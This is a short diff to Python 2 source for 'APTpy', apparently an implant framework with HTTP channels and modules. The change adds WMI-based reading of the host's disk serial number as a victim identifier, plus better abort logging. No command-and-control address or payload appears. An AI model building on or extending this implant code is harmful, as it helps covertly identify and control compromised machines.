@@ -1,6 +1,7 @@
 import logging
 import logging.handlers
 import Queue
+import wmi
 from threading import Event
 from time import sleep
 DEBUG = True
@@ -8,6 +9,7 @@ DEBUG = True
 
 class APTpy:
     def __init__(self):
+        self.id = None
         self.channel = None
         self.modules = []
         self.queue_send = Queue.Queue()
@@ -64,7 +66,9 @@ class APTpy:
                         self.events[className].clear()
 
     def _checkenv(self):
-        pass
+        info = wmi.WMI()
+        disk = info.Win32_PhysicalMedia()[0].SerialNumber.strip()
+        self.id = disk
 
     def _registerChannels(self):
         from lib.channels.http import HttpChannel
@@ -80,6 +84,6 @@ class APTpy:
 try:
     obj = APTpy()
     obj.run()
-except:
+except Exception, e:
     if DEBUG:
-        print "[!] Operation aborted"
+        print "[!] Operation aborted: " + str(type(e)) + e.message
